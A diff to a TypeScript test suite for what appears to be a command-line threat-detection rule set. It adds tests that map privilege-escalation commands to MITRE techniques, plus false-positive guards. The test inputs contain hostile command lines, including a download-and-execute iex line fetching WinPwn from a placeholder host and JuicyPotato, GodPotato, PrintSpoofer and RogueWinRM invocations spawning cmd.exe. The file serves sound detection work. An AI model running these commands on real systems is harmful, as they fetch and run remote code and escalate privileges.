@@ -229,6 +229,42 @@ describe("tradecraftRules — weak (Medium) dual-use tooling", () => {
   });
 });
 
+describe("tradecraftRules — access-token manipulation and coercion privilege escalation", () => {
+  it("flags WinPwn's Add-Type AdjPriv token helper as strong T1134.001", () => {
+    for (const cmd of [
+      "Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPri",
+      "Add-Type -TypeDefinition $Advapi32 -Name Native -MemberDefinition AdjustTokenPrivileges",
+      "iex (new-object net.webclient).downloadstring('http://x/WinPwn.ps1'); WinPwn -noninteractive",
+    ]) {
+      const r = sig(cmd);
+      expect(r?.weight, cmd).toBe("strong");
+      expect(r?.mitre, cmd).toContain("T1134.001");
+    }
+  });
+
+  it("grades a bare escalation privilege name as weak, and leaves backup privileges alone", () => {
+    const r = sig("$null = Enable-Privilege SeImpersonatePrivilege");
+    expect(r?.weight).toBe("weak");
+    expect(r?.mitre).toContain("T1134.001");
+    // SeBackupPrivilege / SeRestorePrivilege are deliberately absent: backup software enables them.
+    expect(sig("Enable-Privilege SeBackupPrivilege")).toBeNull();
+  });
+
+  it("flags RogueWinRM and the Potato family as strong T1068 / T1134.002", () => {
+    for (const cmd of [
+      'C:\\Users\\IEUser\\Tools\\PrivEsc\\RogueWinRM.exe -p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
+      "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *",
+      'GodPotato -cmd "cmd /c whoami"',
+      "PrintSpoofer.exe -i -c cmd",
+    ]) {
+      const r = sig(cmd);
+      expect(r?.weight, cmd).toBe("strong");
+      expect(r?.mitre, cmd).toContain("T1068");
+      expect(r?.mitre, cmd).toContain("T1134.002");
+    }
+  });
+});
+
 describe("tradecraftRules — false-positive guards (must NOT flag benign admin activity)", () => {
   it("does not flag routine commands", () => {
     for (const cmd of [
@@ -254,6 +290,8 @@ describe("tradecraftRules — false-positive guards (must NOT flag benign admin 
       "Get-WinEvent -LogName Security -MaxEvents 10", // reading logs, not clearing them
       "qemu-system-x86_64.exe -m 2048 -hda disk.img", // normal VM boot, no hostfwd backdoor
       "Invoke-RestMethod -Uri https://api.contoso.com/status", // plain API GET, not upload/exfil
+      "Add-Type -AssemblyName System.Windows.Forms", // ordinary .NET type load, not the token API
+      "winrm quickconfig -q", // configuring WinRM is not RogueWinRM
     ]) {
       expect(sig(cmd), cmd).toBeNull();
     }
